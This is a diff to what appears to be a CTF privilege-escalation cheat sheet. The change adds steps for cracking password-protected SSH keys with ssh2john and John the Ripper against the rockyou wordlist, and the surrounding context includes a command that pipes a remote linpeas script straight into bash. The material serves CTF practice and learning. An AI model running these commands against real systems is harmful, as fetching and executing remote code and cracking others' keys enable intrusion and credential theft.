@@ -309,6 +309,27 @@ Curl Pipe a remote URL directly to Bash (linpeas):
 curl -sSk "http://10.10.10.10/linpeas.sh" | bash
 ```
 
+## Using SSH Keys
+Often, we are provided with password protected SSH keys on CTF boxes.  It it helpful to be able to quicky crack and add these to your private keys.
+
+First we need to convert the ssh key using John:
+```
+kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john
+...
+```
+
+Next we will need to use that format to crack the password:
+```
+/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john
+```
+
+John should output a password for the private key.
+
+```
+
+```
+
+
 ## References
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   
